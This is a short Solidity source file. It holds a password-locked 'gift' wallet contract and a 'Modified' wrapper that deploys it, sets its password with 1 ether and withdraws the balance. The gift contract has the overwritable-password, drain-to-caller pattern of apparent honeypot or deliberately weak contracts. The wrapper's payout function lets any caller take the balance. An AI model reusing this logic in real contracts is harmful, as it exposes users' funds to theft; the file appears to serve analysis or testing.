pragma solidity ^0.4.19;

contract NEW_YEARS_GIFT
{
    string message;
    
    bool public passHasBeenSet = false;
    
    address public sender;
    
    bytes32 public hashPass;
	
	function() public payable{}
    
    function GetHash(bytes pass) public constant returns (bytes32) {return sha3(pass);}
    
    function SetPass(bytes32 hash)
    public
    payable
    {
        if( (!passHasBeenSet&&(msg.value > 1 ether)) || hashPass==0x0 )
        {
            hashPass = hash;
            sender = msg.sender;
        }
    }
    
    function SetMessage(string _message)
    public
    {
        if(msg.sender==sender)
        {
            message =_message;
        }
    }
    
    function GetGift(bytes pass)
    external
    payable
    returns (string)
    {
        if(hashPass == sha3(pass))
        {
            msg.sender.transfer(this.balance);
            return message;
        }
    }
    
    function Revoce()
    public
    payable
    {
        if(msg.sender==sender)
        {
            sender.transfer(this.balance);
            message="";
        }
    }
    
    function PassHasBeenSet(bytes32 hash)
    public
    {
        if(msg.sender==sender&&hash==hashPass)
        {
           passHasBeenSet=true;
        }
    }
}

contract Modified {
    
    
    NEW_YEARS_GIFT public C;
    // address public owner;
    constructor() public {
        C = new NEW_YEARS_GIFT();
    }
    
    function() public payable{}

    
    function newPassSetCall(bytes32 hash) public payable{
        C.SetPass.value(1 ether)(hash);
        C.PassHasBeenSet(hash);
    }
    
     function payout() public {
        C.Revoce();
        msg.sender.transfer(this.balance);
     }
    
}
